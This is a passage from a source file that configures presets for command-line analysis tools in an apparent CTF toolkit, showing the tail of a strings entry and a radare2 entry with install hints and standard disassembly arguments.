			{ label: 'Default strings', description: '{target}', args: '{target}' },
			{ label: 'Min length 8', description: '-n 8 {target}', args: '-n 8 {target}' },
			{ label: 'All strings (any section)', description: '-a {target}', args: '-a {target}' },
		],
	},
	{
		id: 'radare2',
		name: 'radare2',
		binary: 'r2',
		description: 'Reverse engineering framework — disassembly, debugging, analysis',
		category: 'ctf-analysis',
		source: 'https://github.com/radareorg/radare2',
		installHint: 'sudo apt install radare2  OR  brew install radare2',
		presets: [
			{ label: 'Analyze all + print functions', description: '-A -c "afl" {target}', args: '-A -c "afl" {target}' },
			{ label: 'Auto-analysis + main', description: '-A -c "s main; pdf" {target}', args: '-A -c "s main; pdf" {target}' },
			{ label: 'Interactive mode', description: '{target}', args: '{target}' },
		],
	},
];
